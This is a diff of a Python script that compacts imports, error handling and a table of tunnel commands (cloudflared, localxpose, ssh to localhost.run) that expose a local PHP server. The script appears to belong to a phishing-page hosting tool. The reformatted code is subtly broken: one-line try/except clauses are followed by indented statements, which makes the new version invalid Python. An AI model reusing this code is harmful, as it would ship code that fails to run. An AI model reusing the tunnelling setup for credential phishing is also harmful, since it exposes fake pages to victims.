@@ -45,42 +45,18 @@ from glob import glob
 from hashlib import sha256
 from json import (dumps as stringify,
     loads as parse)
-from os import ( getenv,kill, listdir,makedirs,mkdir,mknod, popen,remove, rename,replace,system)
-from os.path import ( abspath, basename,dirname,isdir, isfile,join )
+from os import (getenv,kill,listdir,makedirs,mkdir,mknod,popen,remove,rename,replace,system)
+from os.path import (abspath,basename,dirname,isdir,isfile,join)
 from platform import uname
 from re import search, sub
-from shutil import (copy as cp, copy2,  copyfile,  copytree, get_terminal_size, rmtree,)
-from signal import (
-    SIGINT,
-    SIGKILL,
-    SIGTERM
-)
-from subprocess import (
-    DEVNULL,
-    PIPE,
-    Popen,
-    STDOUT,
-    call,
-    run
-)
+from shutil import (copy as cp,copy2,copyfile,copytree,get_terminal_size, rmtree,)
+from signal import (SIGINT,SIGKILL,SIGTERM)
+from subprocess import (DEVNULL,PIPE,Popen,STDOUT,call,run)
 from smtplib import SMTP_SSL as smtp
-from socket import (
-    AF_INET as inet,
-    SOCK_STREAM as stream,
-    setdefaulttimeout,
-    socket
-)
-from sys import (
-    argv,
-    stdout,
-    version_info
-)
+from socket import (AF_INET as inet,SOCK_STREAM as stream,setdefaulttimeout,socket)
+from sys import (argv,stdout,version_info)
 from tarfile import open as taropen
-from time import (
-    ctime,
-    sleep,
-    time
-)
+from time import (ctime,sleep,time)
 from zipfile import ZipFile
 
 
@@ -139,10 +115,8 @@ tunnelers = [ "cloudflared", "loclx" ]
 processes = [ "php", "ssh", "cloudflared", "loclx", "localxpose", ]
 
 
-try:
-    test = popen("cd $HOME && pwd").read()
-except:
-    exit()
+try:test = popen("cd $HOME && pwd").read()
+except:exit()
 
 supported_version = 3
 
@@ -151,40 +125,24 @@ if version_info[0] != supported_version:
     exit(0)
 
 for module in modules:
-    try:
-        eximport(module)
+    try:eximport(module)
     except ImportError:
-        try:
-            print(f"Installing {module}")
+        try:print(f"Installing {module}") 
             run(f"pip3 install {module}", shell=True)
-        except:
-            print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
-            exit(1)
-    except:
-        exit(1)
+        except:print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
+               exit(1)
+    except:exit(1)
 
 for module in modules:
-    try:
-        eximport(module)
-    except:
-        print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
-        exit(1)
+    try:eximport(module)
+    except:print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
+           exit(1)
 
-from requests import (
-    get,
-    head,
-    Session
-)
+from requests import (get,head,Session)
 from requests.exceptions import ConnectionError
 from rich.console import Console
 from rich.panel import Panel
-from rich.progress import (
-    BarColumn,
-    Progress,
-    TextColumn,
-    TimeRemainingColumn,
-    TransferSpeedColumn
-)
+from rich.progress import (BarColumn,Progress,TextColumn,TimeRemainingColumn,TransferSpeedColumn)
 from rich.traceback import install as override_default_traceback
 
 override_default_traceback()
@@ -267,14 +225,7 @@ update = args.noupdate
 
 local_url = f"127.0.0.1:{port}"
 
-ts_commands = {
-    "cloudflared": f"{cf_command} tunnel -url {local_url}",
-    "localxpose": f"{lx_command} tunnel http -t {local_url}",
-    "localhostrun": f"ssh -R 80:{local_url} localhost.run -T -n",
-    "cf": f"{cf_command} tunnel -url {local_url}",
-    "loclx": f"{lx_command} tunnel http -t {local_url}",
-    "lhr": f"ssh -R 80:{local_url} localhost.run -T -n"
-}
+ts_commands = {"cloudflared": f"{cf_command} tunnel -url {local_url}","localxpose": f"{lx_command} tunnel http -t {local_url}","localhostrun": f"ssh -R 80:{local_url} localhost.run -T -n","cf": f"{cf_command} tunnel -url {local_url}","loclx": f"{lx_command} tunnel http -t {local_url}","lhr": f"ssh -R 80:{local_url} localhost.run -T -n"}
 
 
 # My utility functions
